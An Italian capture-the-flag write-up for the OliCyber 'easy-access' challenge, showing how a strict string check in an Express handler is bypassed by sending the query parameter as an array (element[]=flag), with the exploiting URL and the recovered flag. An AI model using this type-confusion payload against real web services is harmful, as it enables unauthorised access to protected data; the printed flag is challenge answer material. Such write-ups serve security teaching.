> Impossibile accedere alla flag, davvero, impossibile fare altrimenti.

Passando "flag", riceviamo un "you wish". Dal file index.js dato nella challenge, ci concentriamo sulla gestione delle POST:

```javascript
const element = req.query.element;
var content = "";
if (element === "flag") {
  content = "you wish";
} else {
  content = data[element] || "Element not found";
}
```

Possiamo passare element[]=flag, così il confronto con triplo uguale darà false ma quando andremo ad usare element come indice dell'array questo verrà convertito nella stringa flag, quindi: `http://easy-access.challs.olicyber.it/element?element[]=flag`:

```
Element: flag
Content: flag{¿who_does_not_love_easy_access?}
```